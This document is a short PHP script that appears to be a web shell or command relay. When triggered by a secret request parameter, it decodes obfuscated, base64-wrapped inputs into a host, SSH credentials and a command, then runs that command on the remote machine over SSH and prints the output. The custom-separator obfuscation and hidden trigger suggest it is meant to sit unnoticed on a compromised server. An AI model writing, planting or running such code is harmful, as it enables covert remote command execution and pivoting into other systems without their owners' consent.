<?php
if(isset($_REQUEST['xt']) && $_REQUEST['xt'] == 'go'){
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
	$a 		= $_REQUEST['xtm'];
	$seu 	= str_replace(array('o0fFs','vfR3l','h40xu','d4m1P','m35v4','sd40l','jjKU0','w31Mk','fGld1','zlIPQ'),'[|]',$a);
	$xu  	= explode('[|]',$seu);
	
	function bg20($a){
		$sep = str_replace(array('o0gKs','v1u3l','h43Ru','d0mB1','mu5R4','s4G0i','j01Uo','o31Mn','rHlb2','klg1R'),'[|]',$a);
		$xa  = explode('[|]',$sep);
		$val1 = $xa[0];
		$val2 = $xa[2];
		$a	= substr($val1,9);
		$b	= substr($val2,0,-5);
		return base64_decode($a).base64_decode($b);
	}
	
	/* SANBOX PAGE */
	$ip		= bg20($xu[0]);
	$usr	= bg20($xu[1]);
	$pas	= bg20($xu[2]);
	$exe	= bg20($xu[3]);

	/* $xt		= $_REQUEST['xt'];
	$ip		= base64_decode($_REQUEST['rip']);
	$user	= base64_decode($_REQUEST['rus']);
	$pass	= base64_decode($_REQUEST['rup']);
	$exe	= base64_decode($_REQUEST['rex']); */

	// $connection = ssh2_connect('shell.example.com', 22);
	$connection = ssh2_connect($ip, 22);
	ssh2_auth_password($connection, $usr, $pas);

	// $stream = ssh2_exec($connection, '/usr/local/bin/php -i');
	$stream = ssh2_exec($connection, $exe);
	stream_set_blocking($stream,true);

	$r = stream_get_contents($stream);

	$xm = $r; 

	echo $xm;

}else{
	
}